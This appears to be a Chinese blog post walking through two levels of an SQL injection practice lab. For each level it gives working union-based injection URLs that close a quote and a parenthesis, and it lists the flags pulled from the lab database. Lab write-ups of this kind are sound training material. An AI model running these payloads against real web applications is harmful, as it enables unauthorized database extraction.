---
date: "2020-12-09T00:00:00Z"
description: 掌控安全 SQL 注入靶场练习 - 引号括号错误注入
keywords: SQL 注入
tags:
- 安全
- SQL注入
title: 掌控安全 SQL 注入靶场练习 - 引号括号错误注入
---

# 掌控安全 SQL 注入靶场练习 - 引号括号错误注入

根据之前的经验，已经猜测出过关 Flag 的值了。

接下来两关是  **引号** 与 **括号** 的组合。


## 0x01 括号单引号

1. 注意闭合 单引号 和 括号

```sql
--- 1. 注意闭合 单引号 和 括号
http://vulhub.example.com:81/Pass-03/index.php?id=1') and 1=2 union select 1,2,(select group_concat(flag) from error_flag) --+ 1

--- flags: zKaQ-Nf,zKaQ-BJY,zKaQ-XiaoFang,zKaq-98K
```

## 0x02 括号双引号

1. 注意闭合 单引号 和 括号

```sql
--- 1. 注意闭合 双引号 和 括号
http://vulhub.example.com:81/Pass-04/index.php?id=1") and 1=2 union select 1,2,(select group_concat(flag) from error_flag) --+ 1

--- flags: zKaQ-Nf,zKaQ-BJY,zKaQ-XiaoFang,zKaq-98K
```